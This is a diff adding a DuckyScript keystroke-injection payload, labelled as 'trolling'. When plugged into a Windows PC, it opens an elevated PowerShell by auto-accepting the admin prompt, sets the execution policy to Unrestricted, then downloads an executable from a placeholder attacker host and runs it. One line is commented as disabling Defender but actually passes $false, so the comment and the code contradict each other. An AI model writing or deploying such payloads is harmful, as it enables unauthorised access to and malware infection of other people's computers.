@@ -1,0 +1,24 @@
+REM trolling!
+CTRL ESCAPE
+DELAY 200
+STRING powershell
+DELAY 100
+CONTROL SHIFT ENTER
+DELAY 300
+ALT y
+DELAY 300
+REM Disabling defender
+STRING Set-MpPreference -DisableRealtimeMonitoring $false
+ENTER
+DELAY 100
+STRING Set-ExecutionPolicy Unrestricted -Force
+ENTER
+DELAY 100
+STRING cd ~
+ENTER
+DELAY 100
+REM Getting special file
+STRING Invoke-WebRequest -Uri '<INSERT IP>/<INSERT FILE>' -OutFile '.\lol.exe'
+ENTER
+DELAY 100
+STRING .\lol.exe
